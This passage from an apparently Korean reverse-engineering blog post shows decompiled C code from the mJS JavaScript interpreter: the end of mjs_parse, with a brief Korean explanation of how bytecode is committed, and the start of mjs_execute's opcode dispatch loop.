</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cs_varint_encode</span>(map_len, (<span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.buf[p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len], llen);
</span></span><span style="display:flex;"><span>  p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len <span style="color:#f92672">+=</span> llen;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_append</span>(<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.buf[start_idx] <span style="color:#f92672">=</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len <span style="color:#f92672">-</span> start_idx;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_free</span>(<span style="color:#f92672">&amp;</span>p.offset_lineno_map);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( res )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mbuf_free</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>bcode_gen);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mjs_bcode_commit</span>(mjsa);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>mjs_parse 함수의 뒷부분을 보면 파싱이 끝나고 mjs_bcode_commit을 통해서 mjs-&gt;bcode_parts로 바이트 코드를 옮기는 것을 알 수 있다.</p>
<h3 id="mjs_execute">mjs_execute<a hidden class="anchor" aria-hidden="true" href="#mjs_execute">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_execute</span>(mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">size_t</span> off, <span style="color:#66d9ef">mjs_val_t</span> <span style="color:#f92672">*</span>res)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mjs_val_t</span> v3; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v4; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v5; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v6; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v7; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v8; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v9; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v10; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v11; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v12; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v13; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v14; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v15; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v16; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v17; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> v18; <span style="color:#75715e">// xmm0_8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v19; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__m128d</span> v20; <span style="color:#75715e">// xmm1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v21; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>ptr)(mjs <span style="color:#f92672">*</span>); <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> <span style="color:#f92672">*</span>v23; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v24; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__m128d</span> v25; <span style="color:#75715e">// xmm1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v26; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__m128d</span> v27; <span style="color:#75715e">// xmm1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v28; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__m128d</span> v29; <span style="color:#75715e">// xmm1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v30; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> <span style="color:#f92672">*</span>v31; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v32; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v33; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v34; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs_bcode_part <span style="color:#f92672">*</span>v35; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v36; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs_err error; <span style="color:#75715e">// [rsp+4h] [rbp-2DCh]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v39; <span style="color:#75715e">// [rsp+8h] [rbp-2D8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v40; <span style="color:#75715e">// [rsp+10h] [rbp-2D0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v41; <span style="color:#75715e">// [rsp+18h] [rbp-2C8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v42; <span style="color:#75715e">// [rsp+20h] [rbp-2C0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v43; <span style="color:#75715e">// [rsp+28h] [rbp-2B8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mbuf <span style="color:#f92672">*</span>p_loop_addresses; <span style="color:#75715e">// [rsp+30h] [rbp-2B0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mbuf <span style="color:#f92672">*</span>v45; <span style="color:#75715e">// [rsp+38h] [rbp-2A8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mbuf <span style="color:#f92672">*</span>v46; <span style="color:#75715e">// [rsp+68h] [rbp-278h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v47; <span style="color:#75715e">// [rsp+70h] [rbp-270h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v48; <span style="color:#75715e">// [rsp+78h] [rbp-268h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v49; <span style="color:#75715e">// [rsp+80h] [rbp-260h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v50; <span style="color:#75715e">// [rsp+88h] [rbp-258h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mbuf <span style="color:#f92672">*</span>p_arg_stack; <span style="color:#75715e">// [rsp+90h] [rbp-250h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v52; <span style="color:#75715e">// [rsp+98h] [rbp-248h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v53; <span style="color:#75715e">// [rsp+A0h] [rbp-240h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v54; <span style="color:#75715e">// [rsp+A8h] [rbp-238h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v55; <span style="color:#75715e">// [rsp+B0h] [rbp-230h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v56; <span style="color:#75715e">// [rsp+B8h] [rbp-228h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mbuf <span style="color:#f92672">*</span>m; <span style="color:#75715e">// [rsp+C0h] [rbp-220h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v58; <span style="color:#75715e">// [rsp+C8h] [rbp-218h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v59; <span style="color:#75715e">// [rsp+D0h] [rbp-210h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v60; <span style="color:#75715e">// [rsp+D8h] [rbp-208h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v61; <span style="color:#75715e">// [rsp+E0h] [rbp-200h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v62; <span style="color:#75715e">// [rsp+E8h] [rbp-1F8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v63; <span style="color:#75715e">// [rsp+F0h] [rbp-1F0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v64; <span style="color:#75715e">// [rsp+F8h] [rbp-1E8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v65; <span style="color:#75715e">// [rsp+100h] [rbp-1E0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v66; <span style="color:#75715e">// [rsp+108h] [rbp-1D8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v67; <span style="color:#75715e">// [rsp+110h] [rbp-1D0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v68; <span style="color:#75715e">// [rsp+118h] [rbp-1C8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> scopes_len_1; <span style="color:#75715e">// [rsp+128h] [rbp-1B8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> scopes_len_0; <span style="color:#75715e">// [rsp+130h] [rbp-1B0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> off_0; <span style="color:#75715e">// [rsp+13Ch] [rbp-1A4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> off_0a; <span style="color:#75715e">// [rsp+13Ch] [rbp-1A4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> l2; <span style="color:#75715e">// [rsp+140h] [rbp-1A0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> l1; <span style="color:#75715e">// [rsp+144h] [rbp-19Ch] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> b; <span style="color:#75715e">// [rsp+148h] [rbp-198h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> a; <span style="color:#75715e">// [rsp+150h] [rbp-190h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> op; <span style="color:#75715e">// [rsp+15Ch] [rbp-184h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> retval_pos; <span style="color:#75715e">// [rsp+160h] [rbp-180h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v; <span style="color:#75715e">// [rsp+168h] [rbp-178h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key_3; <span style="color:#75715e">// [rsp+170h] [rbp-170h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj_2; <span style="color:#75715e">// [rsp+178h] [rbp-168h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v82; <span style="color:#75715e">// [rsp+180h] [rbp-160h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> n_7; <span style="color:#75715e">// [rsp+184h] [rbp-15Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen2; <span style="color:#75715e">// [rsp+188h] [rbp-158h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen1; <span style="color:#75715e">// [rsp+18Ch] [rbp-154h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> off_call; <span style="color:#75715e">// [rsp+190h] [rbp-150h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> retval_stack_idx; <span style="color:#75715e">// [rsp+198h] [rbp-148h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> <span style="color:#f92672">*</span>func; <span style="color:#75715e">// [rsp+1A0h] [rbp-140h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> func_pos; <span style="color:#75715e">// [rsp+1ACh] [rbp-134h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> off_ret; <span style="color:#75715e">// [rsp+1B0h] [rbp-130h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> scope; <span style="color:#75715e">// [rsp+1B8h] [rbp-128h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key_2; <span style="color:#75715e">// [rsp+1C0h] [rbp-120h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> name; <span style="color:#75715e">// [rsp+1C8h] [rbp-118h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj_1; <span style="color:#75715e">// [rsp+1D0h] [rbp-110h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> <span style="color:#f92672">*</span>iterator; <span style="color:#75715e">// [rsp+1D8h] [rbp-108h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> n_6; <span style="color:#75715e">// [rsp+1E0h] [rbp-100h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen_6; <span style="color:#75715e">// [rsp+1E4h] [rbp-FCh] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int64_t</span> n_5; <span style="color:#75715e">// [rsp+1E8h] [rbp-F8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen_5; <span style="color:#75715e">// [rsp+1F4h] [rbp-ECh] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> length; <span style="color:#75715e">// [rsp+1F8h] [rbp-E8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen_4; <span style="color:#75715e">// [rsp+1FCh] [rbp-E4h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> val_0; <span style="color:#75715e">// [rsp+200h] [rbp-E0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key_1; <span style="color:#75715e">// [rsp+208h] [rbp-D8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj_0; <span style="color:#75715e">// [rsp+210h] [rbp-D0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> arr; <span style="color:#75715e">// [rsp+220h] [rbp-C0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> val; <span style="color:#75715e">// [rsp+228h] [rbp-B8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key_0; <span style="color:#75715e">// [rsp+230h] [rbp-B0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj; <span style="color:#75715e">// [rsp+238h] [rbp-A8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key; <span style="color:#75715e">// [rsp+240h] [rbp-A0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> n_3; <span style="color:#75715e">// [rsp+24Ch] [rbp-94h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen_3; <span style="color:#75715e">// [rsp+250h] [rbp-90h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> n_2; <span style="color:#75715e">// [rsp+254h] [rbp-8Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen_2; <span style="color:#75715e">// [rsp+258h] [rbp-88h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> n_1; <span style="color:#75715e">// [rsp+25Ch] [rbp-84h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen_1; <span style="color:#75715e">// [rsp+260h] [rbp-80h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> n_0; <span style="color:#75715e">// [rsp+264h] [rbp-7Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen_0; <span style="color:#75715e">// [rsp+268h] [rbp-78h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> n; <span style="color:#75715e">// [rsp+26Ch] [rbp-74h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> llen; <span style="color:#75715e">// [rsp+270h] [rbp-70h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_header_item_t</span> bcode_offset; <span style="color:#75715e">// [rsp+274h] [rbp-6Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs_bcode_part bp_0; <span style="color:#75715e">// [rsp+278h] [rbp-68h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>code; <span style="color:#75715e">// [rsp+298h] [rbp-48h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> start_off; <span style="color:#75715e">// [rsp+2A0h] [rbp-40h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> loop_addresses_len; <span style="color:#75715e">// [rsp+2A8h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> scopes_len; <span style="color:#75715e">// [rsp+2ACh] [rbp-34h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> len; <span style="color:#75715e">// [rsp+2B0h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> call_stack_len; <span style="color:#75715e">// [rsp+2B4h] [rbp-2Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> stack_len; <span style="color:#75715e">// [rsp+2B8h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint8_t</span> opcode; <span style="color:#75715e">// [rsp+2BEh] [rbp-22h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint8_t</span> prev_opcode; <span style="color:#75715e">// [rsp+2BFh] [rbp-21h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> i; <span style="color:#75715e">// [rsp+2C0h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> <span style="color:#f92672">*</span>resa; <span style="color:#75715e">// [rsp+2C8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> offa; <span style="color:#75715e">// [rsp+2D0h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>mjsa; <span style="color:#75715e">// [rsp+2D8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  mjsa <span style="color:#f92672">=</span> mjs;
</span></span><span style="display:flex;"><span>  offa <span style="color:#f92672">=</span> off;
</span></span><span style="display:flex;"><span>  resa <span style="color:#f92672">=</span> res;
</span></span><span style="display:flex;"><span>  prev_opcode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x27</span>;
</span></span><span style="display:flex;"><span>  opcode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x27</span>;
</span></span><span style="display:flex;"><span>  stack_len <span style="color:#f92672">=</span> mjs<span style="color:#f92672">-&gt;</span>stack.len;
</span></span><span style="display:flex;"><span>  call_stack_len <span style="color:#f92672">=</span> mjs<span style="color:#f92672">-&gt;</span>call_stack.len;
</span></span><span style="display:flex;"><span>  len <span style="color:#f92672">=</span> mjs<span style="color:#f92672">-&gt;</span>arg_stack.len;
</span></span><span style="display:flex;"><span>  scopes_len <span style="color:#f92672">=</span> mjs<span style="color:#f92672">-&gt;</span>scopes.len;
</span></span><span style="display:flex;"><span>  loop_addresses_len <span style="color:#f92672">=</span> mjs<span style="color:#f92672">-&gt;</span>loop_addresses.len;
</span></span><span style="display:flex;"><span>  start_off <span style="color:#f92672">=</span> off;
</span></span><span style="display:flex;"><span>  bp_0 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mjs_bcode_part_get_by_offset</span>(mjs, off);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mjs_set_errorf</span>(mjs, MJS_OK, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(mjs<span style="color:#f92672">-&gt;</span>stack_trace);
</span></span><span style="display:flex;"><span>  mjs<span style="color:#f92672">-&gt;</span>stack_trace <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  offa <span style="color:#f92672">-=</span> bp_0.start_idx;
</span></span><span style="display:flex;"><span>  i <span style="color:#f92672">=</span> offa;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">&gt;=</span> bp_0.data.len )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> clean;
</span></span><span style="display:flex;"><span>    mjsa<span style="color:#f92672">-&gt;</span>cur_bcode_offset <span style="color:#f92672">=</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)mjsa <span style="color:#f92672">+</span> <span style="color:#ae81ff">464</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">maybe_gc</span>(mjsa) )
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)mjsa <span style="color:#f92672">+</span> <span style="color:#ae81ff">464</span>) <span style="color:#f92672">&amp;=</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">2u</span>;
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)bp_0.data.p;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mjs_disasm_single</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)bp_0.data.p, i);
</span></span><span style="display:flex;"><span>    prev_opcode <span style="color:#f92672">=</span> opcode;
</span></span><span style="display:flex;"><span>    opcode <span style="color:#f92672">=</span> code[i];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( opcode )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        v47 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v24 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v47, v24);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
